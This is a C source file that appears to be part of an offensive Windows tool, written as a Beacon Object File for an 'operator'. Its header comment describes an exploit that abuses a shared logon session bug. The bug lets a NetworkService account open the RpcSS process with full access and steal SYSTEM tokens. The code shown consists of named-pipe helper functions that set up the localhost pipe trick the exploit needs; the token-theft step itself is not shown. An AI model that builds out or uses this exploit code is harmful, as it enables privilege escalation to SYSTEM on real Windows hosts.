/*!
 *
 * Network Service Exploit: Abuses the shared logon
 * session ID bug documented by James Forshaw that
 * permits a NetworkService account to acquire a
 * session ID matching RpcSS service, allowing it to
 * open the process with ALL_ACCESS handle.
 *
 * Using this access, the attacker may be able to
 * enumerate any active handles open within the 
 * process, and steal any SYSTEM tokens available to
 * it.
 *
 * For the bug to work properly, the attacker must
 * create a named pipe server handle and access it
 * from the local NPFS redirection using localhost 
 * as the server name.
 *
!*/
#include "common.h"

HANDLE NamedPipeFile(
	IN LPCSTR lpPipePath
	)
{
	/*++
	 *
	 * Uses CreateFileA() to open a handle to the
	 * named pipe as a client, and returns a handle
	 * for the client to use.
	 *
	 * If the pipe has not been created yet, the 
	 * function will return INVALID_HANDLE_VALUE.
	 *
	--*/
	return KERNEL32$CreateFileA( lpPipePath,
								 GENERIC_READ | GENERIC_WRITE,
								 0,
								 NULL,
								 OPEN_EXISTING,
								 FILE_ATTRIBUTE_NORMAL,
								 NULL );
};

HANDLE NamedPipeOpen( 
	IN LPCSTR lpPipePath
	)
{
	/*++
	 *
	 * Uses CreateNamedPipeA() to create a named pipe
	 * handle, and returns it back to the user for use.
	 *
	 * If the pipe cannot be created, the function will
	 * return INVALID_HANDLE_VALUE back the operator.
	 *
	--*/
	return KERNEL32$CreateNamedPipeA( lpPipePath,
									( PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE ),
									( PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT ),
									  1,
									  0,
									  0,
									  0,
									  NULL );
};

BOOL NamedPipeFree(
	IN HANDLE lpNamePipe
	)
{
	/*++
	 *
	 * Uses DisconnectNamedPipe() and CloseHandle() to
	 * disconnect the pipe from any connected clients
	 * somewhat forcibly.
	 *
	 * On success, the function will return TRUE, else
	 * FALSE on failure.
	 *
	--*/
	if ( KERNEL32$DisconnectNamedPipe( lpNamePipe ) ) {
		return KERNEL32$CloseHandle( lpNamePipe );
	};
	return FALSE;
};

BOOL NamedPipeWait(
	IN HANDLE lpNamePipe
	)
{
	/*++
	 *
	 * Uses ConnectNamedPipe() to wait for an active
	 * connection. For the "wait" to occur whilst 
	 * hanging, the pipe must be created with PIPE_WAIT.
	 *
	 * On success, the function will return TRUE and
	 * any underlying functions can leverage them to
	 * perform actions.
	 *
	--*/
	if ( KERNEL32$ConnectNamedPipe( lpNamePipe, NULL ) ) {
		return TRUE;
	} else {
		if ( KERNEL32$GetLastError() == ERROR_PIPE_CONNECTED )
			return TRUE;
	};
	return FALSE;
};
